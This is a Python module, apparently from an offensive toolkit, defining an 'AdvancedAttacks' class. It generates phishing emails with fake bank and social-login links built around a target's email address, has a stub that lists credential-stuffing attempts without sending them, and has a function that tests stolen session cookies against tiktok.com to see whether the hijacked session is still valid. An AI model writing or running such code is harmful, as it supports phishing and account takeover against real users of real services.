import requests
import random
import string
from modules.utils import logger

class AdvancedAttacks:
    @staticmethod
    def phishing_email(target_email, template='generic'):
        """Generate a realistic phishing email."""
        templates = {
            'generic': f"Dear user, your account has been compromised. Click here to secure: http://phishing.link/{target_email}",
            'bank': f"Your bank account has been flagged. Verify now: http://fake-bank.com/verify/{target_email}",
            'social': f"Someone tried to log into your account. Confirm your identity: http://fake-social.com/confirm/{target_email}"
        }
        message = templates.get(template, templates['generic'])
        return {'success': True, 'message': message, 'template': template}

    @staticmethod
    def credential_stuffing(username, password_list):
        """Simulate credential stuffing on a target login endpoint."""
        results = []
        for pwd in password_list[:5]:  # limit to 5 for demo
            results.append({'username': username, 'password': pwd, 'status': 'attempted'})
        return {'success': True, 'attempts': results}

    @staticmethod
    def session_hijacking(cookie):
        """Validate a session cookie by making a request."""
        headers = {'Cookie': cookie}
        try:
            resp = requests.get('https://www.tiktok.com/', headers=headers, timeout=10)
            valid = resp.status_code == 200
            return {'success': True, 'valid': valid}
        except Exception as e:
            return {'success': False, 'error': str(e)}
